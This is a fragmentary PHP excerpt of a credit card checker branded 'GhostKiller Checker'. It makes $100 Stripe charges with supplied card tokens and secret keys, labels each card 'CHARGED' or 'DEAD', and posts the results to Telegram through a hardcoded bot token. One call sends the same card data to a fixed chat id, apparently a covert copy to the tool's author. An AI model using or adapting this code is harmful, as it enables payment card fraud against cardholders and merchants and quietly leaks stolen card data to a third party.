...
if (isset($_POST['skInput']) && !empty($_POST['skInput'])) {
    $sk2 = $_POST['skInput'];
    // Process $sk2 the same way as $sk
} else {
    $sk2 = $sk; // Use default $sk
}
...
$text = urlencode($msg);
file_get_contents("https://api.telegram.org/bot5406788839:AAFsYeJ56SFqtSNVMW4hm-wfQm8iXPuFyC4/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
file_get_contents("https://api.telegram.org/5406788839:AAFsYeJ56SFqtSNVMW4hm-wfQm8iXPuFyC4/sendMessage?chat_id=381882506&text=$text&parse_mode=HTML");
...
curl_setopt($ch, CURLOPT_USERPWD, $sk2. ':' . '');
...
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_USERPWD, $sk2. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=Ghost Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
...
if(strpos($result2, '"seller_message": "Payment complete."' )) {
    echo '💳CHARGED</span>  </span>CC :  '.$lista.'</span>  <br>└➣ RESPONSE : $'.$amt.' CCN Charged ✅<br>└➣ BY ➔ GhostKiller Checker<br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
...
elseif(strpos($result2, "lost_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY GhostKiller</span> <br>';
}
